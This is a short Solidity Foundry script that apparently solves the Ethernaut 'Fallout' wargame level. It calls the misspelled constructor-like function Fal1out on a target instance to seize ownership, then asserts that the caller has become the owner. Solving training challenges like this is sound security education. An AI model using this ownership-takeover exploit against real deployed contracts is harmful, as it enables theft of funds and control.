// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";

interface IFallout {
    function Fal1out() external payable;
    function owner() external view returns (address);
}

contract HackFallout is Script {
    function run() external {
        address falloutInstance = vm.envAddress("FALLOUT_ADDRESS");
        address player = vm.addr(vm.envUint("PRIVATE_KEY"));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IFallout(falloutInstance).Fal1out{value: 0.001 ether}();

        vm.stopBroadcast();

        require(
            IFallout(falloutInstance).owner() == player,
            "Exploit failed: not the owner"
        );
    }
}
